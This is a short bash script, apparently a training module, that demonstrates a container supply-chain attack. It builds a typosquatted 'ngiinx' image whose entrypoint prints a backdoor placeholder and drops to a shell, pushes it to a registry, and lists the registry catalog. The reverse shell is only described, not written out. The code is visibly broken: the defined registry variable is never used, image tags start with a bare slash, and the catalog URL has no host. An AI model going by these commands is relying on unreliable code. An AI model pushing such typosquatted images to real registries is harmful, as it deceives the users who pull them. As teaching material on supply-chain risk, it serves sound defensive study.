#!/usr/bin/env bash
# MODULE 8: Supply Chain Attack Demo
# Simulates typosquatting and backdoored image push

REGISTRY="registry:5000"

echo "[*] Building typosquatted image (ngiinx vs nginx)..."
cat > /tmp/Dockerfile.typo << 'EOF'
FROM alpine:3.18
RUN echo "Legitimate nginx-looking app" > /app.sh
RUN echo '#!/bin/sh' > /entrypoint.sh && \
    echo 'echo "[BACKDOOR] Reverse shell would connect to C2 here"' >> /entrypoint.sh && \
    echo '/bin/sh' >> /entrypoint.sh && \
    chmod +x /entrypoint.sh
CMD ["/entrypoint.sh"]
EOF

docker build -t /ngiinx:latest -f /tmp/Dockerfile.typo /tmp
docker push /ngiinx:latest
echo "[!] Backdoored typosquat image pushed to registry"

echo "[*] Scanning registry for all images..."
curl -sf http:///v2/_catalog

echo "[*] Pulling and inspecting backdoored image layers..."
docker pull /ngiinx:latest
docker history /ngiinx:latest --no-trunc
